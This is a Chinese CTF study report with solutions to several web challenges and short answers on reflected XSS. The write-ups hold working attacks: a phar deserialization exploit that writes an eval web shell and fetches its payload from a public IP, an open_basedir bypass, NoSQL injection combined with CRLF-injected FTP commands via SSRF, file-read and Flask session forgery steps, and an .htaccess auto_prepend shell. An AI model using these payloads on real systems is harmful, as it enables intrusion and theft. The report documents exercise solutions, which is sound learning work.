# Nepnep学习报告 web第三周

- BUU 5道wp
- nodejs 8 CRLF注入
- php特殊函数 
- hacker 101 问题与思考

## [D3CTF 2019]EzUpload

源码

```php
<?php
class dir{
    public $userdir;
    public $url;
    public $filename;
    public function __construct($url,$filename) {
        $this->userdir = "upload/" . md5($_SERVER["REMOTE_ADDR"]);
        $this->url = $url;
        $this->filename  =  $filename;
        if (!file_exists($this->userdir)) {
            mkdir($this->userdir, 0777, true);
        }
    }
    public function checkdir(){
        if ($this->userdir != "upload/" . md5($_SERVER["REMOTE_ADDR"])) {
            die('dir hacker!!!');
        }
    }
    public function checkurl(){
        $r = parse_url($this->url);
        if (!isset($r['scheme']) || preg_match("/file|php/i",$r['scheme'])){
            die('scheme hacker!!!');
        }
    }
    public function checkext(){
        if (stristr($this->filename,'..')){
            die('.. hacker!!!');
        }
        if (stristr($this->filename,'/')){
            die('/ hacker!!!');
        }
        $ext = substr($this->filename, strrpos($this->filename, ".") + 1);
        if (preg_match("/ph/i", $ext)){
            die('php hacker!!!');
        }
    }
    public function upload(){
        $this->checkdir();
        $this->checkurl();
        $this->checkext();
        $content = file_get_contents($this->url,NULL,NULL,0,2048);
        if (preg_match("/\<\?|value|on|type|flag|auto|set|\\\\/i", $content)){
            die('content hacker!!!');
        }
        file_put_contents($this->userdir."/".$this->filename,$content);
    }
    public function remove(){
        $this->checkdir();
        $this->checkext();
        if (file_exists($this->userdir."/".$this->filename)){
            unlink($this->userdir."/".$this->filename);
        }
    }
    public function count($dir) {
        if ($dir === ''){
            $num = count(scandir($this->userdir)) - 2;
        }
        else {
            $num = count(scandir($dir)) - 2;
        }
        if($num > 0) {
            return "you have $num files";
        }
        else{
            return "you don't have file";
        }
    }
    public function __toString() {
        return implode(" ",scandir(__DIR__."/".$this->userdir));
    }
    public function __destruct() {
        $string = "your file in : ".$this->userdir;
        file_put_contents($this->filename.".txt", $string);
        echo $string;
    }
}

if (!isset($_POST['action']) || !isset($_POST['url']) || !isset($_POST['filename'])){
    highlight_file(__FILE__);
    die();
}

$dir = new dir($_POST['url'],$_POST['filename']);
if($_POST['action'] === "upload") {
    $dir->upload();
}
elseif ($_POST['action'] === "remove") {
    $dir->remove();
}
elseif ($_POST['action'] === "count") {
    if (!isset($_POST['dir'])){
        echo $dir->count('');
    } else {
        echo $dir->count($_POST['dir']);
    }
}
```

可以发现有很明显的反序列化漏洞, 也就是 `echo $string;` 可以触发 `__toString` 建立一个 txt 文件, 而文件中写入的内容是 `$userdir` , 也就是我们可以先尝试写入 txt 文件然后用 .htaccess 文件将 txt 解析为 php

exp.php

```php
<?php

class dir{
    public $userdir;
    public $url;
    public $filename;
}

function TransferPhar($file){
    $raw = base64_encode(file_get_contents($file));
    echo "action=upload&filename=phar.txt&url=data:image/png;base64,".$raw;
}

$d = new dir();
$d->userdir = new dir();
$d->userdir->userdir = "../";
$phar = new Phar("dir.phar");
$phar->startBuffering();
$phar->setStub("GIF89A"."__HALT_COMPILER();"); //设置stub，增加gif文件头用以欺骗检测
$phar->setMetadata($d); //将自定义meta-data存入manifest
$phar->addFromString("test.jpg", "test"); //添加要压缩的文件
$phar->stopBuffering();

TransferPhar('./dir.phar');
?>
```

然后采用 `data:image/png;base64,...` 

```
action=upload&filename=phar.txt&url=data:image/png;base64,R0lGODlBX19IQUxUX0NPTVBJTEVSKCk7ID8+DQqyAAAAAQAAABEAAAABAAAAAAB8AAAATzozOiJkaXIiOjM6e3M6NzoidXNlcmRpciI7TzozOiJkaXIiOjM6e3M6NzoidXNlcmRpciI7czozOiIuLi8iO3M6MzoidXJsIjtOO3M6ODoiZmlsZW5hbWUiO047fXM6MzoidXJsIjtOO3M6ODoiZmlsZW5hbWUiO047fQgAAAB0ZXN0LmpwZwQAAADsHHRgBAAAAAx+f9i2AQAAAAAAAHRlc3Q+cvt5vPBx7JkuiBtXr4iWjSUwJwIAAABHQk1C
```

然后解析读取目录

```
action=upload&filename=&url=phar://upload/d99081fe929b750e0557f85e6499103f/phar.txt
```

读到目录, 获得绝对路径

```
/var/www/html/e6be5b6def555465/upload/d99081fe929b750e0557f85e6499103f/
```

写入shell

```php
<?php

class dir{
    public $userdir;
    public $url;
    public $filename;

    public function __construct(){
        $this->filename = '/var/www/html/e6be5b6def555465/upload/d99081fe929b750e0557f85e6499103f/ricky';
        $this->userdir = 'zzzzzzzzz<?php eval($_POST["cmd"]); ?>zzzzzzzzzzz';  # 防止被读取到过滤字符
        $this->url = '1';
    }
}

function TransferPhar($file){
    $raw = base64_encode(file_get_contents($file));
    echo "action=upload&filename=phar.txt&url=data:image/png;base64,".$raw;
}

$d = new dir();
echo urlencode(serialize($d));
$phar = new Phar("shell.phar");
$phar->startBuffering();
$phar->setStub("GIF89A"."__HALT_COMPILER();"); //设置stub，增加gif文件头用以欺骗检测
$phar->setMetadata($d); //将自定义meta-data存入manifest
$phar->addFromString("test.jpg", "test"); //添加要压缩的文件
$phar->stopBuffering();

TransferPhar('./shell.phar');
system("gzip ./shell.phar");
?>
```

放在公网上做成 gz 文件写入 (base64解析时被禁用了如果改一下的话或许可以直接绕过)

```
action=upload&filename=phar.txt&url=http://39.97.114.43/public/shell
```

然后触发 phar 反序列化

```
action=upload&filename=&url=phar://upload/d99081fe929b750e0557f85e6499103f/phar.txt
```

触发如图所示

![20210412211341178](https://raw.githubusercontent.com/Ricky-369369/Rickyweb/main/Nepnep/Probation/img/20210412211341178.png)

成功后就会把🐎写入 ricky.txt

![20210412211455939](https://raw.githubusercontent.com/Ricky-369369/Rickyweb/main/Nepnep/Probation/img/20210412211455939.png)

换用这个 .htaccess 内容解析 txt 文件

```
AddHandler php7-script .txt
```

base64 写入或者公网写入

```
action=upload&filename=.htaccess&url=data:image/png;base64,QWRkSGFuZGxlciBwaHA3LXNjcmlwdCAudHh0
```

再访问就发现已经可以 getshell 了

![20210412212005842](https://raw.githubusercontent.com/Ricky-369369/Rickyweb/main/Nepnep/Probation/img/20210412212005842.png)

有 open_basedir 的限制, 可以用 ini_set 绕过

```
cmd=ini_set('open_basedir','..');mkdir('hack');chdir('hack');chdir('..');chdir('..');chdir('..');chdir('..');chdir('..');chdir('..');chdir('..');ini_set('open_basedir','/');var_dump(scandir('/'));highlight_file('F1aG_1s_H4r4');
```

结果

![20210412213521568](https://raw.githubusercontent.com/Ricky-369369/Rickyweb/main/Nepnep/Probation/img/20210412213521568.png)

## [MRCTF2021]Half-Nosqli

给了 docker-compose.yml

```
version: '3'
services:
  ftp:
    restart: always
    build:
      context: ftp/
      dockerfile: Dockerfile
    container_name: nosqli_ftp
    expose:
      - 8899
  web:
    build:
      context: web/
      dockerfile: Dockerfile
    ports:
      - "23000:3000"
    depends_on: 
      - mongodb
  mongodb:
    restart: always
    image: mongo:4.0-xenial
    container_name: nosqli_mongodb
    volumes:
      - ./db:/data/db
    expose:
      - 27017

networks:
  nosqli-net:
```

处于同一个网络下可以使用 docker 命名访问

```
http://web:3000/
http://nosqli_mongodb:27017/
http://nosqli_ftp:8899/
http://ftp:8899/
```

根据题目描述的swagger, 访问 /docs 可以进入 api 接口, 然后就是 nosql 注入得到 jwt token (json 传参)

```
{
  "email": {"$ne": ""},
  "password": {"$ne": ""}
}
```

然后进入 /home 发现是一个可以访问 外网 和 内网 的 url, 前提是必须 `http://` 开头, 其它的均会解析失败, 题目又说 flag 放在 ftp 的 files 里面, 所以需要伪造 ftp 数据包, nodejs 可以进行 [CRLF 注入](http://www.iricky.ltd/2021/01/27/31.html#Nodejs8_SSRF) , 尝试用高编码导入 ftp 数据包, ftp 控制命令如下

![20210414092205951](https://raw.githubusercontent.com/Ricky-369369/Rickyweb/main/Nepnep/Probation/img/20210414092205951.png)

```
USER anonymous # 登录匿名用户
PASS anonymous # 登录匿名用户
CWD files      # 转换到 files 目录
TYPE I         # 输出文件类型 binary
PORT n1,n2,n3,n4,n5,n6 # 设置主动的ip和端口，格式见上
RETR flag # 获取flag
```

然后把这些数据当作包传过去, 整体脚本如下

```python
# -*-coding:utf-8-*-
import requests
import json

url = "http://node.mrctf.fun:23000/"

# 例如 1.1.1.1 需要 1,1,1,1 输入, 监听端口8888
payload ='''
USER anonymous
PASS anonymous
CWD files
TYPE I
PORT xxx,xxx,xxx,xxx,0,8888
RETR flag
'''.replace("\n", "\r\n")

headers_1 = {
    "Content-Type": "application/json",
}

data_1 = {
  "email": {"$ne": ""},
  "password": {"$ne": ""},
}

def payload_encode(raw):
    ret = u""
    for i in raw:
        ret += chr(0xff00+ord(i))
    return ret

if __name__ == '__main__':
    jwtt = requests.post(url=url + 'login', headers=headers_1, data=json.dumps(data_1))
    token = jwtt.json()['token']
    url_payload = "http://nosqli_ftp:8899/"
    # url_payload = "http://ftp:8899/"
    url_payload = url_payload + payload_encode(payload)

    headers_2 = {
        "Accept": "*/*",
        "Authorization": "Bearer " + token,
    }

    json = {
        "url": url_payload
    }

    req = requests.post(url=url+"home", headers=headers_2, json=json)

    print(req.text)
```

然后在自己的服务器上

```
nc -lvp 8888
```

结果

![20210414204048513](https://raw.githubusercontent.com/Ricky-369369/Rickyweb/main/Nepnep/Probation/img/20210414204048513.png)

## [WMCTF2020]Web Check in

源码

```
<?php
//PHP 7.0.33 Apache/2.4.25
error_reporting(0);
$sandbox = '/var/www/html/sandbox/' . md5($_SERVER['REMOTE_ADDR']);
@mkdir($sandbox);
@chdir($sandbox);
var_dump("Sandbox:".$sandbox);
highlight_file(__FILE__);
if(isset($_GET['content'])) {
    $content = $_GET['content'];
    if(preg_match('/iconv|UCS|UTF|rot|quoted|base64/i',$content))
         die('hacker');
    if(file_exists($content))
        require_once($content);
    file_put_contents($content,'<?php exit();'.$content);
}
```

**题解补在了第四周**

## [PASECA2019]honey_shop

flasksession伪造图中

有个`*click to download our sweet images*`可以任意文件下载, 尝试访问Python环境变量

```
/download?image=../../../../../../../proc/self/environ
```

得到 SECRET_KEY

```
SECRET_KEY=p0vFa0N5J6kEqjCxefMIEzeSwBf4USyyM3HIANUv
```

进行flasksession伪造

```
python3 flask_session_cookie_manager3.py encode -s 'p0vFa0N5J6kEqjCxefMIEzeSwBf4USyyM3HIANUv' -t '{"balance":10000, "purchases":[]}'
```

## [XNUCA2019Qualifier]EasyPHP

源码

```php
<?php
    $files = scandir('./'); 
    foreach($files as $file) {
        if(is_file($file)){
            if ($file !== "index.php") {
                unlink($file);
            }
        }
    }
    include_once("fl3g.php");
    if(!isset($_GET['content']) || !isset($_GET['filename'])) {
        highlight_file(__FILE__);
        die();
    }
    $content = $_GET['content'];
    if(stristr($content,'on') || stristr($content,'html') || stristr($content,'type') || stristr($content,'flag') || stristr($content,'upload') || stristr($content,'file')) {
        echo "Hacker";
        die();
    }
    $filename = $_GET['filename'];
    if(preg_match("/[^a-z\.]/", $filename) == 1) {
        echo "Hacker";
        die();
    }
    $files = scandir('./'); 
    foreach($files as $file) {
        if(is_file($file)){
            if ($file !== "index.php") {
                unlink($file);
            }
        }
    }
    file_put_contents($filename, $content . "\nJust one chance");
?>
```

.htaccess写入,还有一句话木马后面的\

上文提到用\来转义换行符来绕过最后加一行的限制

所以同理也可以用\来绕过stristr处的所有限制

```
php_value auto_prepend_fi\
le .htaccess
#<?php system('cat /fla'.'g');?>\
```

进行编码

```
php_value%20auto_prepend_fi\%0ale%20.htaccess%0a%23<?php%20system('cat%20/fla'.'g');?>\
```

上传 (过了一遍目录, 发现flag在根目录)

```
?content=php_value%20auto_prepend_fi\%0ale%20.htaccess%0a%23<?php%20system('cat%20/fla'.'g');?>\&filename=.htaccess
```

## PHP特殊函数 FILTER_VALIDATE_BOOLEAN

> FILTER_VALIDATE_BOOLEAN 过滤器把值作为布尔选项来验证。
>
> - Name: "boolean"
> - ID-number: 258
>
> 可能的返回值：
>
> - 如果是 "1", "true", "on" 以及 "yes"，则返回 true。
> - 如果是 "0", "false", "off", "no" 以及 ""，则返回 false。
> - 否则返回 NULL

源码

```php
 <?php
highlight_file(__FILE__);
error_reporting(0);
include('flag.php');
$b=$_GET['b'];
if(filter_var ($b,FILTER_VALIDATE_BOOLEAN)){
    if($b=='true' || intval($b)>0){
        die('FLAG NOT HERE');
    }else{
        echo $flag;
    }
} 
```

payload

```
?b=on
?b=yes
```

## Hacker101

1.本视频一开始介绍了哪两个工具，他们的作用分别是什么？为什么作者会推荐firefox，它的优点是什么？

答: 介绍了火狐和Burp Proxy, Burp Proxy 可以控制代替, 与 Burpsuite 配合使用可以抓取数据包, 火狐适合代理测试.

2.本视频中体现了哪些攻防上的哲学观点？作者希望你养成什么样的思维？这些思维在帮助你挖掘漏洞的时候有什么帮助？结合你的经历与视频内容谈谈你的看法。

答: 攻防是一体的, 永远不可能找到全部的漏洞, 攻和防是处于平衡的状态; 挖漏洞尝试从一些传参还有传输信号的地方探测.

3.审计以下代码：

```php
<?php
if(isset($_GET[ ' name ' ])){
echo "<h1>Hello {$_GET['name']} !</h1>";
}
?>
<form method="GET">
Enter your name: <input type="input" name="name"><br>
<input type=" submit">
```

本段代码涉及到客户端，服务端以及通信协议。

运行在客户端的代码主要有HTML以及javascript，由浏览器核心负责解释 

通信协议为HTTP协议，有多种格式的请求包，常见的为POST与GET 

运行在服务端的代码为php，由php核心负责解释。 

用户端与服务端通过HTTP通信协议进行交互。 

那么，以上代码中，哪些部分属于客户端的内容，哪些属于服务端的内容？

答:  客户端是 html 部分, 服务端是 php 运行的代码. 

客户端是通过传递什么参数来控制服务端代码的？ 

答:  get传参的name.

客户端通过控制该参数会对服务端造成什么影响，继而使得客户端本身收到影响，从而造成了什么漏洞？

答:  对服务器造成了反射型 XSS 的攻击, 使得客户端本身可以欺骗用户获取信息.

如果是xss漏洞，具体又是什么类型的xss漏洞，为什么？ 

答:  反射型XSS, 因为传输过去的参数 name 会直接显示给我们, 该页面在用户的浏览器中显示, 输入就会弹出消息.

4.思考：现实中如何利用xss漏洞实施攻击，我们应该如何预防？

答:  如果没有对特殊字符进行HTML转义，都存在被XSS利用的漏洞, 所以在数据返回前端页面前，将【<】【>】【"】【'】【&】全转义可以预防几乎所有的XSS回响. 

## 小结

- Nosqli注入 + nodejs 8 CRLF 伪造 ftp 协议攻击
- .htaccess 文件包含
- php 特殊函数 FILTER_VALIDATE_BOOLEAN 了解